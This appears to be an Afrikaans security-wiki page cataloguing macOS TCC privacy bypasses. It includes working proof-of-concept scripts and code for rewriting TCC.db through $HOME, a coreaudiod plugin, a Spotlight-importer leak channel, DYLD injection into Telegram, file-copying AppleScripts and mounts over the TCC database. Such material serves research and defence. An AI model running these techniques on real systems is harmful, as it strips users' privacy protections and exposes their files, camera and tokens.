# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Volgens funksionaliteit

### Write Bypass

Dit is nie ’n bypass nie; dit is net hoe TCC werk: **Dit beskerm nie teen skryf nie**. As Terminal **nie toegang het om die Desktop van ’n gebruiker te lees nie, kan dit steeds daarin skryf**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

Die **uitgebreide attribuut `com.apple.macl`** word by die nuwe **lêer** gevoeg om die **skepper-app** toegang te gee om dit te lees.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Dit is moontlik om **’n venster oor die TCC-aanporboodskap te plaas** sodat die gebruiker dit **aanvaar** sonder om dit agter te kom. Jy kan ’n PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

’n Aanvaller kan **apps met enige naam skep** (bv. Finder, Google Chrome...) in die **`Info.plist`** en dit toegang laat aanvra tot ’n TCC-beskermde ligging. Die gebruiker sal dink dat die wettige toepassing hierdie toegang aanvra.\
Daarbenewens is dit moontlik om **die wettige app uit die Dock te verwyder en die vals een daar te plaas**, sodat wanneer die gebruiker op die vals een klik (wat dieselfde ikoon kan gebruik), dit die wettige een kan aanroep, TCC-toestemmings kan aanvra en malware kan uitvoer, wat die gebruiker laat glo dat die wettige app toegang aangevra het.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Meer inligting en ’n PoC by:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

By verstek het ’n toegang via **SSH vroeër “Full Disk Access” gehad**. Om dit te deaktiveer, moet dit gelys wees, maar gedeaktiveer (as jy dit uit die lys verwyder, word daardie voorregte nie verwyder nie):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

Hier kan jy voorbeelde vind van hoe sommige **malware hierdie beskerming kon omseil**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Let daarop dat jy nou **Full Disk Access** nodig het om SSH te kan aktiveer

### Hanteer uitbreidings - CVE-2022-26767

Die attribuut **`com.apple.macl`** word aan lêers toegeken om **’n bepaalde toepassing toestemming te gee om dit te lees.** Hierdie attribuut word gestel wanneer ’n lêer na ’n app **gesleep en laat val** word, of wanneer ’n gebruiker op ’n lêer **dubbelklik** om dit met die **standaardtoepassing** oop te maak.

’n Gebruiker kan dus **’n kwaadwillige app registreer** om al die uitbreidings te hanteer en Launch Services aanroep om enige lêer **oop te maak** (sodat die kwaadwillige lêer toestemming kry om dit te lees).<sup>[[23]](#references)</sup>

### iCloud

Met die entitlement **`com.apple.private.icloud-account-access`** is dit moontlik om met die **`com.apple.iCloudHelper`** XPC-diens te kommunikeer, wat **iCloud-tokens sal verskaf**.

**iMovie** en **Garageband** het hierdie entitlement en ander gehad wat dit moontlik gemaak het.

Vir meer **inligting** oor die exploit om **iCloud-tokens** met daardie entitlement te bekom, kyk na die praatjie: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Spotlight importer-lek via Darwin notification name

’n Spotlight importer kan die lêer lees wat Spotlight aan sy `GetMetadataForFile`-terugbelroetine deurgee, selfs wanneer ’n gewone proses sonder Full Disk Access dit nie kan lees nie. Anders as [code injection in ’n TCC-gemagtigde proses](../macos-tcc-credential-and-data-theft.md), vereis dit ’n plaaslike vastrapplek wat ’n importer kan installeer, asook ’n ooreenstemmende Spotlight-indekseringsgebeurtenis. Die importer is in ’n sandbox, maar Darwin-notifications wat net name bevat, kan grepe data na ’n luisteraar buite daardie sandbox dra. Dit is ’n data-lekkanaal, nie ’n roete na root of willekeurige lêertoegang vanuit die importer nie.<sup>[[24]](#references)</sup>

Verklaar die teikenlêertipe onder `CFBundleDocumentTypes` → `LSItemContentTypes` in die importer se `Info.plist`, en installeer dan die bundel in `~/Library/Spotlight/` of in ’n app se `Contents/Library/Spotlight/`. Kontroleer die registrasie met `mdimport -L`. Die [Spotlight importer-afdeling](../../../../macos-auto-start-locations.md#spotlight-plugins) dek bundelplasing en lêertipepassing. Die importer ontvang slegs lêers waarvoor Spotlight dit kies; ’n bestaande importer geniet oor die algemeen voorrang. Op macOS 26 Tahoe het `mdimport -i` in die gerapporteerde toetse nie betroubaar onmiddellike rekursiewe indeksering afgedwing nie, terwyl `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` ’n herinvoer aangevra het van die UTI’s waarop daardie importer aanspraak maak.<sup>[[24]](#references)</sup>

Begin vir ’n kanaaltoets ’n luisteraar buite die sandbox met `notifyutil -w TEST_TEST_TEST`, en plaas dan ’n notification met `CFNotificationCenterGetDarwinNotifyCenter()` en `NULL` as die objek en `userInfo`. Anders as ’n distributed notification met ’n `userInfo`-payload, het die Darwin notification net sy naam. Vir binêre data, registreer die eksterne luisteraar vir desimale name `0` tot `255` met `notify_register_dispatch`; koppel elke terugbelroetine se registrasie aan sy grepewaarde. Lees binne `GetMetadataForFile` slegs die Spotlight-verskafde `pathToFile` en stuur elke greep as ’n desimale notification-naam:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Die listener rekonstrueer die greepvolgorde eerder as om die TCC-beskermde lêer self te lees. Die gepubliseerde PoC het die eerste 64 grepe van `knowledgeC.db` vanaf ’n terminale sonder FDA herwin, met SIP geaktiveer op macOS 26. Dit het ’n lae bandwydte en is nie ’n betroubare metode om groot hoeveelhede data te kopieer nie: Spotlight indekseer of herindekseer moontlik nie ’n teikenlêer nie, en gelyktydige importer-instansies kan kennisgewingstrome verweef. Sien [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) vir ander meganismes wat sandbox-grense omseil.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

’n App met die **`kTCCServiceAppleEvents`**-toestemming sal **ander Apps kan beheer**. Dit beteken dat dit moontlik **die toestemmings wat aan die ander Apps verleen is, kan misbruik**.<sup>[[2]](#references)</sup>

Vir meer inligting oor Apple Scripts, kyk na:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

As ’n App byvoorbeeld **Automation-toestemming oor `iTerm`** het, soos in hierdie voorbeeld waar **`Terminal`** toegang tot iTerm het:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Oor iTerm

Terminal, wat nie FDA het nie, kan iTerm, wat dit wel het, aanroep en dit gebruik om aksies uit te voer:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Via Finder

Of as ’n App toegang via Finder het, kan dit ’n script soos hierdie een uitvoer:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Volgens app-gedrag

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Die userland **tccd daemon** het die **`HOME`** **env**-veranderlike gebruik om toegang te kry tot die TCC-gebruikersdatabasis by: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Volgens [hierdie Stack Exchange-plasing](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), en omdat die TCC-daemon via `launchd` binne die huidige gebruiker se domein loop, is dit moontlik om **alle omgewingsveranderlikes** wat daaraan deurgegee word, te **beheer**.<sup>[[19]](#references)</sup>\
’n **Aanvaller kan dus die `$HOME`-omgewingsveranderlike** in **`launchctl`** stel om na ’n **beheerde** **gids** te wys, die **TCC**-daemon **herbegin** en dan die **TCC-databasis direk wysig** om aan homself **elke beskikbare TCC-regte** toe te ken sonder dat die eindgebruiker ooit gevra word.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes het toegang gehad tot TCC-beskermde liggings, maar ’n nuutgeskepte nota is **in ’n nie-beskermde ligging gestoor**. ’n Aanvaller kon Notes dus vra om ’n beskermde lêer na ’n nota te kopieer en dan toegang tot die resulterende data vanaf die nie-beskermde ligging verkry:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Die binêre lêer `/usr/libexec/lsd` met die biblioteek `libsecurity_translocate` het die entitlement `com.apple.private.nullfs_allow` gehad, wat dit toegelaat het om **nullfs**-monterings te skep, en die entitlement `com.apple.private.tcc.allow` met **`kTCCServiceSystemPolicyAllFiles`** om toegang tot elke lêer te verkry.

Dit was moontlik om die quarantine-kenmerk by "Library" te voeg, die **`com.apple.security.translocation`** XPC-diens aan te roep, waarna dit Library na **`$TMPDIR/AppTranslocation/d/d/Library`** sou karteer. Al die dokumente binne Library kon dan **verkry** word.

### CVE-2024-44131 - FileProvider symlink race

Programme wat lêerbewerkings aan ’n **bevoorregte helper** oorlaat (hier **`fileproviderd`** / `Files.app`), kopieer of skuif items **namens die gebruiker**, dus word die kopie met die helper se voorregte uitgevoer eerder as dié van die oproeper.

Jamf Threat Labs het gewys dat die symlink-validering wat voor die bewerking plaasvind, **gerace** kan word: in plaas daarvan om die symlink op die **laaste** padkomponent te plaas (wat nagegaan word), vervang die aanvaller ’n **intermediêre** gids in die pad **nadat die kopie reeds begin het**. Die bevoorregte helper volg dan die aanvallerbeheerde skakel en lees/skryf na TCC-beskermde liggings **sonder om ooit ’n prompt te vertoon**.<sup>[[5]](#references)</sup>

Gidse wat **nie** deur ’n ewekansige UUID in hul pad beskerm word nie (byvoorbeeld `~/Library/Mobile Documents/com~apple~CloudDocs`), is die maklikste teikens, omdat die aanvaller die volledige pad kan voorspel om die race uit te voer.

> [!TIP]
> Dit is die algemene patroon waarna jy moet soek: **enige bevoorregte proses wat ’n pad meer as een keer oplos** (check-then-use, of `rename()`/`copyfile()` wat bron en bestemming afsonderlik oplos) kan gerace word deur ’n gids in die middel van die pad te vervang. Slegs `O_NOFOLLOW_ANY`, `openat()` op ’n reeds oopgemaakte gids-FD, of `realpath()` + her-validering sluit die venster werklik.

Meer inligting in [**die Jamf Threat Labs-skrywe**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` kan met `SQLITE_ENABLE_SQLLOG` gebou word, wat ’n logging-hook byvoeg wat deur omgewingsveranderlikes beheer word ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – vir **elke databasis wat oopgemaak word**, word ’n **kopie van die databasislêer** en ’n log van die SQL-stellings in `path` geskryf (die gids moet reeds bestaan).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – maak **elke keer ’n nuwe kopie** wanneer ’n DB oopgemaak/aangeheg word, eerder as om een te hergebruik.
- **`SQLITE_SQLLOG_CONDITIONAL`** – log slegs ’n verbinding as ’n `<database>-sqllog`-lêer langs die hoof-DB bestaan.

As jy hierdie veranderlike in ’n proses kan inspuit wat **FDA** het en SQLite-databasisse oopmaak, sal dit daardie beskermde databasisse geredelik **na ’n gids onder jou beheer kopieer**. Omdat die bestemmingslêernaam van aanvallerbeheerde data afgelei word, verander ’n **symlink wat by die bestemming geplaas word** dieselfde primitief in ’n **willekeurige lêerskryf** met die teikenproses se voorregte.

### **SQLITE_AUTO_TRACE**

As die omgewingsveranderlike **`SQLITE_AUTO_TRACE`** gestel is, sal die biblioteek **`libsqlite3.dylib`** alle SQL-navrae begin **log**. Baie toepassings het hierdie biblioteek gebruik, dus was dit moontlik om al hul SQLite-navrae te log.<sup>[[22]](#references)</sup>

Verskeie Apple-toepassings het hierdie biblioteek gebruik om toegang tot TCC-beskermde inligting te verkry.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Soek na omgewingsveranderlike-gedrewe lêerskrywings

Die twee vorige inskrywings is voorbeelde van dieselfde generiese tegniek, en dit is die moeite werd om na meer te soek: **frameworks wat in TCC-bevoorregte programme gelaai word, stel dikwels debug-/logging-omgewingsveranderlikes bloot wat die proses ’n lêer op ’n oproeper-beheerde pad laat skep**.

Werksvloei om hulle te vind:

1. Kies ’n teiken met FDA of ’n ander aanloklike TCC-toestemming (`Music`, `TV`, `Terminal`, MDM-agente...) en lys die frameworks waarna dit skakel (`otool -L`, `vmmap`).
2. Soek in daardie frameworks vir `getenv`-stringe: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Stel kandidaatveranderlikes met `launchctl setenv NAME /path/you/control`, begin die program en hou dop wat dit op die lêerstelsel doen met `fs_usage -w -f filesys <pid>` of `sudo fs_usage | grep <path>`.
4. As die proses ’n lêer in jou gids **skep of hernoem**, het jy ’n skryfprimitief: wys die bestemming na ’n symlink (of laat ’n wedloop met ’n tussengids ontstaan, soos in CVE-2024-44131 hier bo) om dit na `~/Library/Application Support/com.apple.TCC/TCC.db` te herlei.

> [!TIP]
> Twee dinge beperk dit. Eerstens word **`DYLD_*`-veranderlikes geïgnoreer vir binaries met hardened runtime**, tensy die program die [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)-entitlement insluit ("’n Booleaanse waarde wat aandui of die program deur dinamiese skakelaar-omgewingsveranderlikes beïnvloed mag word, wat jy kan gebruik om code in jou program se proses in te spuit") — sien ook [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Tweedens verwyder Apple individuele framework-debugveranderlikes wanneer dit aangemeld word, dus is ’n veranderlike wat op een macOS-vrystelling gewerk het, dikwels teen die volgende een weg. As ’n program stilweg weier om te begin nadat jy een gestel het, behandel daardie veranderlike asof dit reeds gefiltreer is.<sup>[[7]](#references)[[8]](#references)</sup>

Kyk na [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) vir die soortgelyke truuk met skakelaarveranderlikes.

### Apple Remote Desktop

As root kon jy hierdie diens aktiveer, waarna die **ARD-agent volle skyftoegang sal hê**. ’n Gebruiker kan dit dan misbruik om dit ’n nuwe **TCC-gebruikersdatabasis** te laat kopieer.

## Deur **NFSHomeDirectory**

TCC gebruik ’n databasis in die gebruiker se HOME-lêergids om toegang tot hulpbronne te beheer wat spesifiek vir die gebruiker is, by **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
As die gebruiker dit dus regkry om TCC te herbegin met ’n $HOME-omgewingsveranderlike wat na ’n **ander gids** wys, kan die gebruiker ’n nuwe TCC-databasis in **/Library/Application Support/com.apple.TCC/TCC.db** skep en TCC mislei om enige TCC-toestemming aan enige program toe te staan.

> [!TIP]
> Let daarop dat Apple die instelling in die gebruiker se profiel se **`NFSHomeDirectory`**-kenmerk gebruik as die **waarde van `$HOME`**. As jy dus ’n program met toestemmings om hierdie waarde te wysig (**`kTCCServiceSystemPolicySysAdminFiles`**) kompromitteer, kan jy hierdie opsie **wapeniseer** met ’n TCC-bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Die **eerste POC** gebruik [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) en [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) om die gebruiker se **HOME**-lêergids te wysig.

1. Kry ’n _csreq_-blob vir die teikenprogram.
2. Plaas ’n vals _TCC.db_-lêer met die vereiste toegang en die _csreq_-blob.
3. Voer die gebruiker se Directory Services-inskrywing uit met [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Wysig die Directory Services-inskrywing om die gebruiker se tuisgids te verander.
5. Voer die gewysigde Directory Services-inskrywing in met [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stop die gebruiker se _tccd_ en herbegin die proses.

Die tweede POC het **`/usr/libexec/configd`** gebruik, wat `com.apple.private.tcc.allow` met die waarde `kTCCServiceSystemPolicySysAdminFiles` gehad het.\
Dit was moontlik om **`configd`** met die **`-t`**-opsie te laat loop; ’n aanvaller kon ’n **pasgemaakte Bundle spesifiseer om te laai**. Die exploit **vervang** dus die **`dsexport`**- en **`dsimport`**-metode om die gebruiker se tuisgids te verander met ’n **`configd`-code-inspuiting**.

Vir meer inligting, kyk na die [**oorspronklike verslag**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Deur proses-inspuiting

Daar is verskillende tegnieke om code binne ’n proses in te spuit en die proses se TCC-voorregte te misbruik:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Die algemeenste proses-inspuiting wat gevind is om TCC te omseil, is boonop via **plugins (laai library)**.\
Plugins is bykomende code, gewoonlik in die vorm van libraries of plist-lêers, wat deur die **hoofprogram gelaai word** en binne die program se konteks uitgevoer word. As die hoofprogram dus toegang tot TCC-beperkte lêers gehad het (via toegewyde toestemmings of entitlements), sal die **pasgemaakte code ook toegang hê**.

### CVE-2020-27937 - Directory Utility

Die program `/System/Library/CoreServices/Applications/Directory Utility.app` het die entitlement **`kTCCServiceSystemPolicySysAdminFiles`** gehad, plugins met die **`.daplug`**-uitbreiding gelaai en **nie die hardened runtime gehad nie**.

Om hierdie CVE te wapeniseer, word **`NFSHomeDirectory`** **verander** (deur die vorige entitlement te misbruik) om **beheer oor die gebruiker se TCC-databasis oor te neem** en TCC te omseil.

Vir meer inligting, kyk na die [**oorspronklike verslag**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Die binary **`/usr/sbin/coreaudiod`** het die entitlements `com.apple.security.cs.disable-library-validation` en `com.apple.private.tcc.manager` gehad. Die eerste **het code-inspuiting toegelaat**, en die tweede het dit toegang gegee om **TCC te bestuur**.

Hierdie binary kon **third-party plug-ins** uit die gids `/Library/Audio/Plug-Ins/HAL` laai. Dit was dus moontlik om ’n plugin te laai en die TCC-toestemmings met hierdie POC te misbruik:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Vir meer inligting, kyk na die [**oorspronklike verslag**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Stelseltoepassings wat kamerastrome via Core Media I/O oopmaak (toepassings met **`kTCCServiceCamera`**), laai hierdie inproppe in die proses vanaf `/Library/CoreMediaIO/Plug-Ins/DAL` (nie deur SIP beperk nie).

Deur ’n biblioteek met die gewone **constructor** daar te stoor, sal genoeg wees om **inject code**.

Verskeie Apple-toepassings was kwesbaar hiervoor.

### Firefox

Die Firefox-toepassing het die `com.apple.security.cs.disable-library-validation`- en `com.apple.security.cs.allow-dyld-environment-variables`-entitlements gehad:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Vir meer inligting oor hoe om dit maklik te exploit, [**kyk na die oorspronklike verslag**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Die binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` het die entitlements **`com.apple.private.tcc.allow`** en **`com.apple.security.get-task-allow`** gehad, wat dit moontlik gemaak het om code binne die process te inject en die TCC privileges te gebruik.

### CVE-2023-26818 - Telegram

Telegram het die entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** en **`com.apple.security.cs.disable-library-validation`** gehad, dus was dit moontlik om dit te abuse om **toegang tot sy permissions te kry**, soos om met die kamera op te neem. Jy kan [**die payload in die writeup vind**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Let op hoe ’n **custom plist** geskep is om hierdie library te inject deur die env variable te gebruik om ’n library te load, en hoe **`launchctl`** gebruik is om dit te launch:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Deur open-aanroepe

Dit is moontlik om **`open`** aan te roep, selfs terwyl jy in ’n sandbox is

### Terminal-skripte

Dit is redelik algemeen om Terminal **Full Disk Access (FDA)** te gee, ten minste op rekenaars wat deur tegniese mense gebruik word. Dit is ook moontlik om **`.terminal`**-skripte daarmee aan te roep.

**`.terminal`**-skripte is plist-lêers soos hierdie een, met die opdrag wat in die **`CommandString`**-sleutel uitgevoer moet word:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

’n Toepassing kan ’n terminale skrip op ’n plek soos /tmp skryf en dit met ’n opdrag soos die volgende uitvoer:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Deur te mount

### CVE-2020-9771 - mount_apfs TCC bypass en privilege escalation

**Enige gebruiker** (selfs dié sonder privileges) kan ’n Time Machine-snapshot skep en mount, en **toegang tot AL die lêers** in daardie snapshot kry.\
Die **enigste privilege** wat nodig is, is dat die toepassing wat gebruik word (soos `Terminal`) **Full Disk Access** (FDA)-toegang (`kTCCServiceSystemPolicyAllfiles`) het, wat deur ’n admin toegestaan moet word.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

'n Meer gedetailleerde verduideliking kan [**in die oorspronklike verslag gevind word**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount oor TCC-lêer

Selfs al is die TCC DB-lêer beskerm, was dit moontlik om **die gids te mount** met 'n nuwe TCC.db-lêer:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Gaan die **volledige exploit** na in die [**oorspronklike writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Soos in die [oorspronklike writeup](https://www.kandji.io/blog/macos-audit-story-part2) verduidelik word, het hierdie CVE `diskarbitrationd` uitgebuit.<sup>[[16]](#references)</sup>

Die funksie `DADiskMountWithArgumentsCommon` van die publieke `DiskArbitration`-raamwerk het die sekuriteitskontroles uitgevoer. Dit is egter moontlik om dit te omseil deur `diskarbitrationd` direk aan te roep en dus `../`-elemente in die pad en simboliese skakels te gebruik.

Dit het ’n aanvaller toegelaat om arbitrêre mounts op enige plek uit te voer, insluitend oor die TCC-databasis, as gevolg van die `com.apple.private.security.storage-exempt.heritable`-entitlement van `diskarbitrationd`.

### asr

Die nutsprogram **`/usr/sbin/asr`** het toegelaat dat die hele skyf gekopieer en op ’n ander plek gemount word, waardeur TCC-beskerming omseil is.

### CVE-2022-22655 - Location Services

